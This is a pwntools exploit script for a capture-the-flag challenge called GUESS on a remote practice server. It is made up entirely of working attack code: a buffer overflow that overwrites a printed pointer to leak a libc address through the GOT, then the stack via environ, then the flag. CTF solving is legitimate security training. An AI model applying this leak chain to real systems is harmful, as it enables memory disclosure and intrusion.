from pwn import *


# ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process("./GUESS", env={"LD_PRELOAD":libc_path})
p = remote("node4.buuoj.cn", 28801)
pro = ELF("./GUESS")


read_g = pro.got["read"]
puts_g = pro.got["puts"]

# leak libc 
pad = cyclic(0x128)+p64(read_g)
p.sendlineafter("Please type your guessing flag", pad)
info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# leak stack
libc = ELF(libc_path)
environ = info-libc.sym["read"]+libc.sym["environ"]
pad = cyclic(0x128)+p64(environ)
p.sendlineafter("Please type your guessing flag", pad)
info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))

# get flag
pad = cyclic(0x128)+p64(info-0x168)
p.sendlineafter("Please type your guessing flag", pad)

p.interactive()


